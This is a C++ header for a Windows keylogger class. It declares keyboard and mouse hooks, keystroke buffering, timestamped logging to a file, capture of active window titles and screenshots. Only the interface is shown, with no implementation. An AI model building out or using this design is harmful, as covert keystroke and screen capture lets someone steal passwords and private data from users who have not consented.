#ifndef H_KEYLOGGER
#define H_KEYLOGGER

#define _WIN32_WINNT 0x0501

#include <windows.h>
#include <iostream>
#include <ctime>
#include <fstream>
#include <string>
#include <sstream>

#include "screenshot.h"

//Keyboard codes
#define SC_CTRL 29
#define SC_LSHIFT 42
#define SC_ALT 56
#define SC_RSHIFT 54
#define SC_SPACE 57
#define SC_ENTER 28

class KeyLogger {

    public:

	//singleton
    static KeyLogger* getInstance();
    static void releaseInstance();

    //starts listenning
    void listen();

	//alt keyboard modifier
    bool isAltDown();
    void setAltDown(bool down);

	//ctrl keyboard modifier
    bool isCtrlDown();
    void setCtrlDown(bool down);

	//left shift keyboard modifier
    bool isLShiftDown();
    void setLShiftDown(bool down);

	//right shift
    bool isRShiftDown();
    void setRShiftDown(bool down);

    protected:

    KeyLogger(std::string logFilePath = "out.txt");
    ~KeyLogger();

	void log(std::string text);

	std::string getTimeString();

	void screenshot();

	std::string getActiveWindowTitle();

	void writeBuffer();

	static LRESULT hookFunction(int nCode, WPARAM wParam, LPARAM lParam);

    static KeyLogger* instance;

    bool altDown;
    bool ctrlDown;
    bool lshiftDown;
    bool rshiftDown;

    HHOOK khook, mhook;
	
    std::ofstream logFile;
	std::string logFilePath;

	std::string keyboardBuffer;

	std::string activeWindowTitle;
};

#endif // H_KEYLOGGER
